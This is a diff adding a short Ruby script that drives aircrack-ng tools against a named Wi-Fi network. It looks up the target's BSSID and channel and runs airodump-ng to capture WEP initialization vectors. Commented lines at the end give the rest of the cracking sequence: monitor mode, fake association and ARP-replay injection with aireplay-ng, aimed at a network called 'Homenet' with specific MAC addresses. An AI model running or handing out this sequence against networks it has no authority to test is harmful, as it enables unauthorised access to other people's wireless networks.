@@ -1,0 +1,74 @@
+#!/usr/bin/ruby -w
+# listens (airodump) for IVs
+
+$:.unshift File.join(File.dirname(__FILE__), '.')
+require 'airutils'
+require 'pp'
+
+usage = <<usage
+usage:
+  #{$0} [ssid] [interface] [nohardchanflag]
+usage
+
+# determine interface, command line overrides
+
+iface_listen = nil
+ifaces_wireless = AirUtils.list_ifaces_wireless
+if (ARGV[1])
+  iface_listen = ARGV[1]
+elsif (ifaces_wireless.length == 1) 
+  iface_listen = ifaces_wireless[0]
+else
+  puts usage
+  puts "\navailable interfaces:"
+  pp ifaces_wireless
+  exit 2
+end
+
+if (!ARGV[0]) then
+  puts usage
+  puts "\navailable interfaces:"
+  pp ifaces_wireless
+  exit 2
+end
+
+flag_nohardchan = nil
+if (ARGV[2]) then
+  flag_nohardchan = 1
+end
+
+essid = ARGV[0]
+bssid, channel = AirUtils.parse_scan(essid)
+
+# monitor mode on the proper channel
+		
+#syntax_airmon = "sudo airmon-ng start %s %s" % [$iface_crack, channel]  
+syntax_airmon = "sudo airmon-ng stop %s" % [iface_listen]
+puts "executing %s" % syntax_airmon
+system(syntax_airmon)
+
+# monitor for IVs  
+# TODO: check for multiple channels in scan file, don't set channel if so
+		
+#syntax_airodump = "sudo airodump-ng -c %s --bssid %s -w \"%s\" %s" % [channel, bssid, essid, $iface_crack]
+#syntax_airodump = "sudo airodump-ng --showack --output-format pcap --channel %s --bssid %s -w \"%s\" %s" % [channel, bssid, essid, $iface_crack]
+syntax_airodump = "sudo airodump-ng --ivs --showack --output-format ivs --channel %s --bssid %s -w \"%s\" %s" % [channel, bssid, essid, iface_listen]
+puts syntax_airodump
+system(syntax_airodump)
+
+#sudo airmon-ng stop wlan1
+
+# dump the active APs
+#sudo airodump-ng wlan1
+
+# start monitoring on the channel listed in airodump-ng
+#sudo airmon-ng start wlan1 11 
+
+# start monitoring for IVs
+#sudo airodump-ng -c 11 --bssid 00:1F:33:46:A3:A8 -w output wlan1
+
+# fake associate
+#sudo aireplay-ng -1 0 -e Homenet -a 00:1F:33:46:A3:A8 -h 00:13:02:9b:e3:e6 wlan1
+
+# generate IVs
+#sudo aireplay-ng -3 -b 00:1F:33:46:A3:A8 -h 00:13:02:9b:e3:e6 wlan1
